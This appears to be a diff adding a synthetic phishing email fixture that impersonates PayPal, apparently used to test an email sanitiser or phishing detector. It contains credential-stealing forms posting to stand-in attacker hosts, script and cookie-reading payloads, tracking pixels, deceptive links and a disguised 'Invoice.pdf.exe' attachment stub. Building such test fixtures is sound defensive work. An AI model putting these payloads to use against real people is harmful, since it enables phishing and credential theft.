@@ -1,0 +1,90 @@
+Received: from mail.attacker.example (unknown [203.0.113.45])
+	by mx.victim.example (Postfix) with ESMTP id 4ABC123
+	for <alice@victim.example>; Mon, 12 Oct 2026 09:14:02 +0000
+Received: from localhost (localhost [127.0.0.1])
+	by mail.attacker.example with SMTP; Mon, 12 Oct 2026 09:13:59 +0000
+Authentication-Results: mx.victim.example;
+	spf=softfail smtp.mailfrom=bounce@attacker.example;
+	dkim=none; dmarc=fail header.from=paypal.com
+Return-Path: <bounce@attacker.example>
+From: "service@paypal.com" <security@paypa1-alerts.example>
+Reply-To: <collect@attacker.example>
+To: Alice <alice@victim.example>
+Subject: =?utf-8?B?QWN0aW9uIHJlcXVpcmVkOiB5b3VyIGFjY291bnQgaXMgbGltaXRlZCDwn5SS?=
+Date: Mon, 12 Oct 2026 09:13:58 +0000
+Message-ID: <abc123@bulk.attacker.example>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="MIXED"
+
+--MIXED
+Content-Type: multipart/related; boundary="REL"
+
+--REL
+Content-Type: multipart/alternative; boundary="ALT"
+
+--ALT
+Content-Type: text/plain; charset=utf-8
+
+Your account is limited. Verify at https://www.paypal.com/verify
+
+--ALT
+Content-Type: text/html; charset=utf-8
+
+<html><head>
+<meta http-equiv="refresh" content="0;url=https://attacker.example/refresh">
+<base href="https://attacker.example/">
+<link rel="stylesheet" href="https://attacker.example/style.css">
+<style>@import url("https://attacker.example/import.css"); .hdr{background:url(https://attacker.example/bg.png)} .logo{font-weight:bold}</style>
+<script>document.title='pwned'; fetch('https://attacker.example/js');</script>
+</head>
+<body onload="alert(1)">
+<div class="hdr"><img class="logo" src="cid:logo123@paypal" width="16" height="16" alt="logo"> PayPal</div>
+<p>Dear customer, your account has been <b>limited</b>.</p>
+<p>Please verify at <a href="http://203.0.113.45/login.php">https://www.paypal.com/verify</a> within 24 hours.</p>
+<p><a href="javascript:alert(document.cookie)">Click here</a> or <a href="https://www.paypal.com@evil.example/x">this link</a> or <a href="https://bit.ly/3xyz">short link</a>.</p>
+<form action="https://attacker.example/steal" method="post"><input name="password" type="password"><button>Log in</button></form>
+<img src="https://tracker.attacker.example/pixel.gif?id=alice" width="1" height="1">
+<img src="file://attacker.example/share/x.png" width="20" height="20">
+<table background="https://attacker.example/tablebg.png"><tr><td style="background-image:url('https://attacker.example/td.png')">Styled cell</td></tr></table>
+<iframe src="https://attacker.example/frame"></iframe>
+<svg onload="alert(2)"><image href="https://attacker.example/svg.png"/></svg>
+<img src="https://picsum.photos/id/1/120/60" width="120" height="60" alt="remote banner">
+</body></html>
+
+--ALT--
+
+--REL
+Content-Type: image/png
+Content-ID: <logo123@paypal>
+Content-Disposition: inline; filename="logo.png"
+Content-Transfer-Encoding: base64
+
+iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAF0lEQVR4nGP4z8BAEiJN9aiGUQ1DSgMAkPn/Afnh+ngAAAAASUVORK5CYII=
+
+--REL--
+
+--MIXED
+Content-Type: application/octet-stream; name="Invoice.pdf.exe"
+Content-Disposition: attachment; filename="Invoice.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+--MIXED
+Content-Type: text/html; name="secure-message.html"
+Content-Disposition: attachment; filename="secure-message.html"
+
+<html><body><form action="https://attacker.example/creds"><input name=pw></form><script>location='https://attacker.example'</script></body></html>
+
+--MIXED
+Content-Type: message/rfc822
+Content-Disposition: attachment; filename="forwarded.eml"
+
+From: Inner Sender <inner@other.example>
+To: alice@victim.example
+Subject: Inner forwarded message
+Content-Type: text/html; charset=utf-8
+
+<p>Inner message with <img src="https://attacker.example/inner.png"> and <a href="https://login.microsoftonline.com.attacker.example/">https://login.microsoftonline.com</a></p>
+
+--MIXED--
